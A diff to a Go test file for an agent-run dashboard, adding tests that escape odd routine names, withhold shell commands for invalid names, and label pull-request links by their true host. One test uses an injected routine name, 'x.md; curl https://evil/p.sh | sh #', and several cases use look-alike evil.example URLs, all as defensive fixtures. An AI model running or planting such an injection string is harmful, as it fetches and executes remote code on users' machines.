@@ -2,6 +2,7 @@ package dashboard
 
 import (
 	"context"
+	"fmt"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -635,11 +636,95 @@ func TestPagesLoadNothing(t *testing.T) {
 	}
 }
 
-func TestLinksToRunsAndRoutinesAreEscaped(t *testing.T) {
+// A routine's page is at /routines/<factory>/<routine>, and only names that
+// follow the naming rule have one. Agents choose the routine a run records,
+// and a refused local run has no factory, so the rest are plain text.
+func TestRoutinesLinkOnlyToPagesThatExist(t *testing.T) {
 	w := newWorld(t)
-	w.run(t, "odd", time.Hour, runs.Run{Factory: "ac me", Routine: "odd/routine?x"}, runs.Checkpoint{Status: runs.Succeeded})
+	for i, r := range []runs.Run{
+		{Routine: "norfactory"}, // a refused local run has no factory
+		{Factory: "ac me", Routine: "odd-routine"},
+		{Factory: "acme", Routine: "odd/routine?x"},
+		{Factory: "acme", Routine: ".."},
+		{Factory: "..", Routine: "dotted"},
+	} {
+		w.run(t, fmt.Sprint("odd", i), time.Hour, r, runs.Checkpoint{Status: runs.Succeeded})
+	}
 	h := w.remote()
 	cookies := admin(t, h, "")
 	_, body := get(t, h, cookies, "/_dashboard")
-	wantIn(t, body, `href="/_dashboard/routines/ac%20me/odd%2Froutine%3Fx"`)
+	// The good ones still link, and the others are text.
+	wantIn(t, body, `<a href="/_dashboard/routines/acme/pr-review">pr-review</a>`,
+		"<td>norfactory<", "<td>odd-routine<", "<td>odd/routine?x<", "<td>..<", "<td>dotted<")
+	wantNotIn(t, body, "/_dashboard/routines//", "/_dashboard/routines/ac%20", "/_dashboard/routines/ac me", "routines/acme/odd", "routines/acme/..", "routines/acme/%2E", "routines/../", "routines/%2E")
+
+	for _, name := range []string{"odd0", "odd1", "odd2", "odd3", "odd4"} {
+		code, body := get(t, h, cookies, "/_dashboard/runs/"+w.ids[name])
+		if code != 200 {
+			t.Fatalf("%s: %d", name, code)
+		}
+		wantNotIn(t, body, "/_dashboard/routines/")
+	}
+	// The page of a routine with an odd name is still there for whoever types
+	// its address, and its filters still work.
+	code, body := get(t, h, cookies, "/_dashboard/routines/ac%20me/odd-routine")
+	if code != 200 {
+		t.Fatalf("the page of a routine with an odd factory: %d", code)
+	}
+	wantIn(t, body, `href="/_dashboard/routines/ac%20me/odd-routine?days=7"`)
+	// The run page of a good routine still links to it.
+	_, body = get(t, h, cookies, "/_dashboard/runs/"+w.ids["fifth"])
+	wantIn(t, body, `<a href="/_dashboard/routines/acme/pr-review">pr-review</a>`)
+}
+
+// The name of a routine is whatever the agent sent run_begin, even when
+// Fabrica refused the run, and the run page hands out a command to paste
+// into a shell. Only a name that follows the naming rule gets one.
+func TestRunPageHasNoCommandForABadRoutineName(t *testing.T) {
+	w := newWorld(t)
+	evil := "x.md; curl https://evil/p.sh | sh #"
+	w.run(t, "evil", time.Hour, runs.Run{Factory: "acme", Routine: evil, BlueprintSHA: shaB},
+		runs.Checkpoint{Status: runs.Failed, Author: runs.ByFabrica, Summary: "Refused: there's no routine like that"})
+	h := w.remote()
+	cookies := admin(t, h, "")
+	code, body := get(t, h, cookies, "/_dashboard/runs/"+w.ids["evil"])
+	if code != 200 {
+		t.Fatalf("%d", code)
+	}
+	// It's still shown, as text, to make sense of the refusal.
+	wantIn(t, body, evil)
+	wantNotIn(t, body, "git -C", "blueprint clone", "instructions this run was served")
+}
+
+func TestPRLabelsNameTheirHost(t *testing.T) {
+	for raw, want := range map[string]string{
+		"https://github.com/acme/app/pull/412":                "acme/app#412",
+		"http://github.com/acme/app/pull/412":                 "acme/app#412",
+		"https://GitHub.com/acme/app/pull/412":                "acme/app#412",
+		"https://gitlab.com/acme/app/-/merge_requests/9":      "acme/app!9",
+		"https://gitlab.com/group/sub/app/-/merge_requests/9": "group/sub/app!9",
+		// Anywhere else the label says where the link goes, so it can't pass
+		// for one of GitHub's.
+		"https://evil.example/acme/app/pull/412":            "evil.example/acme/app#412",
+		"https://github.com.evil.example/acme/app/pull/412": "github.com.evil.example/acme/app#412",
+		"https://github.com:8443/acme/app/pull/412":         "github.com:8443/acme/app#412",
+		"https://github.com@evil.example/acme/app/pull/412": "evil.example/acme/app#412",
+		"https://evil.example/github.com/acme/app/pull/412": "evil.example/github.com/acme/app#412",
+		"https://git.acme.dev/acme/app/-/merge_requests/9":  "git.acme.dev/acme/app!9",
+		"https://github.com/acme/app/issues/9":              "github.com/acme/app/issues/9",
+		"https://evil.example/acme/app/issues/9":            "evil.example/acme/app/issues/9",
+	} {
+		if got := prLabel(raw); got != want {
+			t.Errorf("prLabel(%q) = %q, want %q", raw, got, want)
+		}
+	}
+
+	// On the page, too.
+	w := newWorld(t)
+	w.run(t, "spoof", time.Hour, runs.Run{Factory: "acme", Routine: "pr-review"},
+		runs.Checkpoint{Status: runs.Succeeded, Links: []string{"https://evil.example/acme/app/pull/412"}})
+	h := w.remote()
+	_, body := get(t, h, admin(t, h, ""), "/_dashboard")
+	wantIn(t, body, "evil.example/acme/app#412", "acme/app#1")
+	wantNotIn(t, body, ">acme/app#412<")
 }
